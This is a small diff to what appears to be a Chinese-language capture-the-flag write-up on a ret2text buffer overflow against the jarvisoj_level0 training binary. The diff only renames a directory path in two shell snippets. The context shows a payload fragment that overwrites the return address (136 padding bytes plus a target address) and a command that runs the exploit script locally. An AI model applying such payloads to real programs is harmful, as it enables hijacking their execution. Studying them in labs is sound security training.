@@ -38,7 +38,7 @@ b'A' * 136 + p64(0x400597)
 ## 1. 30 秒定性质
 
 ```bash
-cd '/home/yfhd5/Pwn Writeups/ret2text'
+cd '/home/yfhd5/Pwn_Writeups/ret2text'
 
 file jarvisoj_level0
 checksec --file=jarvisoj_level0
@@ -283,7 +283,7 @@ if __name__ == "__main__":
 本地验证：
 
 ```bash
-cd '/home/yfhd5/Pwn Writeups/ret2text'
+cd '/home/yfhd5/Pwn_Writeups/ret2text'
 python 06_jarvisoj_level0_exp.py LOCAL
 ```
 
